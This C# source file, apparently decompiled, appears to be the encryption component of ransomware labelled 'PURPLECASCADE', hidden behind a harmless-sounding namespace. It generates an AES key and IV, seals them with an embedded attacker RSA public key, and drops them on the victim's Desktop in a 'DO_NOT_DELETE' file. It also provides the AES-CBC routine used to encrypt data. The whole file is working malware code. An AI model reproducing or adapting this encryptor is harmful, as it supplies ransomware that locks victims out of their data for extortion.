using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml.Serialization;

namespace WindowsRuntimeSecurity.Encrypter;

internal class AesCryptoService
{
	private static byte[] Key;

	private static byte[] IV;

	public AesCryptoService()
	{
		using Aes aes = Aes.Create();
		Key = aes.Key;
		IV = aes.IV;
		SaveEncryptedKeyAndIV(Encoding.UTF8.GetString(Key) + "\n" + Encoding.UTF8.GetString(IV));
	}

	private void SaveEncryptedKeyAndIV(string plainTextData)
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf - 16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>pU/cZ0jhMOq6RCaQtR2eHhp1UFonLqpFBc+SmUJnn6hH+boLjWOeZ9Dr+5e3btY+prRZmUavpLoMQKLMJq3wenWOCfY06MoWOq+0rWi47XeiyJDdQQBG2DoRiVtM25O4hRiO690Nx7VD3q3e0hFJyYKY4QAnqBo5hWGAx65uvfnWewcKZLxCUYkQ+k5AuIUcUTPuMyYtudI/t+vaqLvm3qbLoCgbdZhdYmExXPRkZIlv2W7eM17su17qaHFZQF3CAGw3QRAw/t6k9gCAJKpoD6ihlhyxXlkmg7h37O+3Twu65AUagVNUl48UUkw30JNtiCkQuMD8XUfbVQ6Y/6wEPQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		StringReader textReader = new StringReader(stringBuilder.ToString());
		RSAParameters parameters = (RSAParameters)new XmlSerializer(typeof(RSAParameters)).Deserialize(textReader);
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.ImportParameters(parameters);
		byte[] bytes = Encoding.Unicode.GetBytes(plainTextData);
		byte[] bytes2 = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: false);
		File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\DO_NOT_DELETE-PURPLECASCADE-CVXC-KEYS.txt", bytes2);
	}

	public string AES_Encrypt(string plainText)
	{
		if (plainText != null && plainText.Length > 0)
		{
			if (Key != null && Key.Length != 0)
			{
				if (IV != null && IV.Length != 0)
				{
					byte[] inArray;
					using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
					{
						aesCryptoServiceProvider.Key = Key;
						aesCryptoServiceProvider.IV = IV;
						aesCryptoServiceProvider.Mode = CipherMode.CBC;
						aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
						ICryptoTransform transform = aesCryptoServiceProvider.CreateEncryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
						using MemoryStream memoryStream = new MemoryStream();
						using CryptoStream stream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
						using (StreamWriter streamWriter = new StreamWriter(stream))
						{
							streamWriter.Write(plainText);
						}
						inArray = memoryStream.ToArray();
					}
					return Convert.ToBase64String(inArray);
				}
				throw new ArgumentNullException("IV");
			}
			throw new ArgumentNullException("Key");
		}
		throw new ArgumentNullException("plainText");
	}
}
